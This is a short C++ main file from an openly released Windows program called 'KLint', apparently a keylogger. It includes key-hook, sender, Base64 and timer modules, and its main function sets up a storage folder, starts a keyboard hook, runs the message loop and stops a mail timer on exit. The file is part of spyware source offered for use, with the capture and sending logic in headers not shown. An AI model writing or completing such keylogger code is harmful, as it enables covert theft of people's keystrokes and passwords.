/*
+---------------------------------+
|              KLINT              |
+----------------+----------------+
|   ID           |  SAK01B32      |
+----------------+----------------+
|   LISENCE      |  MIT           |
+----------------+----------------+
|   VERSION      |  Beta V0.03    |
+----------------+----------------+
|   AUTHOR       |  Shaiq Kar     |
+----------------+----------------+
|   GITHUB       |  @shaiqkar-dev |
+----------------+----------------+
*/

#include <iostream>
#include "windows.h"

#include "KeyConstants.h"
#include "KLint.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "Sender.h"
#include "KeyHooks.h"


int main()
{
	MSG _CTXT;

	IO::mkDir(IO::getBasePath(true));
	startHook();

	while (GetMessage(&_CTXT, NULL, 0, 0))
	{
		TranslateMessage(&_CTXT);
		DispatchMessage(&_CTXT);
	}

	mailTimer.stop();
	return 0;
}

